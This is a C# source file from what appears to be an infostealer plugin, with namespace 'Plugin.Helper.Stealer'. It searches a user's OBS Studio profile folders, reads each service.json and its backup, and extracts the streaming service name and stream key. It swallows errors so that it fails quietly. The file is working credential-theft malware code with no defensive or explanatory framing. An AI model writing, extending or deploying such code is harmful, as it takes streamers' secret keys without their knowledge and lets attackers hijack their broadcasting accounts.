

using System.Collections.Generic;
using System.IO;
using System.Web.Script.Serialization;
using InvokedCommon.Structs;


namespace Plugin.Helper.Stealer
{
	public static class OBS
	{
		public static OBSInfo[] GetInfo()
		{
			string path = Path.Combine(Configuration.roamingAppData, "obs-studio\\basic\\profiles");
			if (!Directory.Exists(path))
				return null;

			JavaScriptSerializer serializer = new JavaScriptSerializer();
			List<OBSInfo> obsInfoList = new List<OBSInfo>();

			foreach (string directory in Directory.GetDirectories(path))
			{
				foreach (string file in new string[] { "service.json", "service.json.bak" })
				{
					string filePath = Path.Combine(directory, file);
					if (!File.Exists(filePath))
						continue;

					string jsonContent = Utils.ForceReadFileString(filePath);
					if (jsonContent == null)
						continue;

					try
					{
						Dictionary<string, object> data = serializer.Deserialize<Dictionary<string, object>>(jsonContent);
						if (data == null)
							continue;

						if (!data.TryGetValue("settings", out object settingsObj) || !(settingsObj is Dictionary<string, object> settings))
							continue;

						if (!settings.TryGetValue("service", out object serviceObj) || !settings.TryGetValue("key", out object keyObj))
							continue;

						string service = serviceObj?.ToString();
						string streamKey = keyObj?.ToString();

						if (service != null && streamKey != null)
							obsInfoList.Add(new OBSInfo(service, streamKey));
					}
					catch
					{
					}
				}
			}

			return obsInfoList.ToArray();
		}
	}
}
